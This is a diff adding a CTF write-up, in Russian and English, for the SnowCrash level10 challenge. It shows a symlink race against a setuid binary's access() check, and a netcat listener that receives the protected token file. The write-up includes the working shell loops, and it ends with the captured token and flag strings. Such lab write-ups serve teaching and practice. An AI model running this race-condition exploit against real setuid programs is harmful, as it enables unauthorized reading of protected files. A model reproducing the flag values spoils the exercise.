@@ -1,0 +1,63 @@
+level10
+
+
+$ ls -l token level10
+-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
+-rw-------  1 flag10 flag10     26 Mar  5  2016 token
+
+$ ./level10
+./level10 file host
+    sends file to host if you have access to it
+
+из string поняли что используется порт 6969
+$ strings level10 
+...
+%s file host
+        sends file to host if you have access to it
+Connecting to %s:6969 ..
+...
+
+
+Мы узнаем, что этот двоичный файл отправляет файл на хост. При некоторой отладке gdb мы узнаем, что он использует первый доступ, чтобы проверить, доступен ли файл, затем он использует сокет для создания соединения на порту 6969, затем открывает файл и записывает содержимое в сокет. С помощью netcat мы можем создать небольшой tcp-сервер, который прослушивает этот порт:
+
+
+nc -l 6969 &
+
+We then try to send the token file to host
+Затем мы попытаемся отправить файл токена на хост
+
+level10@SnowCrash:~$ ./level10 $PWD/token 0.0.0.0
+You don't have access to /home/user/level10/token
+
+
+Хм..., мы не можем использовать этот файл из-за разрешений... Но после некоторого поиска мы обнаружили в Википедии, что мы можем выполнить race condition, чтобы обойти функцию доступа. Так мы и сделали и:
+
+создаем файл с доступом
+
+$ touch /tmp/boom
+
+затем мы создаем цикл, который помещаем в фоновый режим 
+это символическая ссылка /tmp/token сначала на /tmp/boom, а затем на файл токена
+
+$ while true; do
+    ln -sf /tmp/boom /tmp/token;
+    ln -sf /home/user/level10/token /tmp/token;
+done &
+
+затем мы помещаем еще один цикл в фоновом режиме и запускаем исполняемый файл
+
+$ while true; do
+ if ./level10 /tmp/token 0.0.0.0 &>/dev/null; then break; fi
+ done &
+
+затем мы запускаем цикл, который каждые 0,1 с запускает сервер netcat и иногда печатает флаг
+
+while sleep 0.1; do
+  nc -l 6969
+done
+
+level10@SnowCrash:~$ .*( )*.
+woupa2yuojeeaaed06riuj63c
+
+level10
+feulo4b72j7edeahuete3no7c
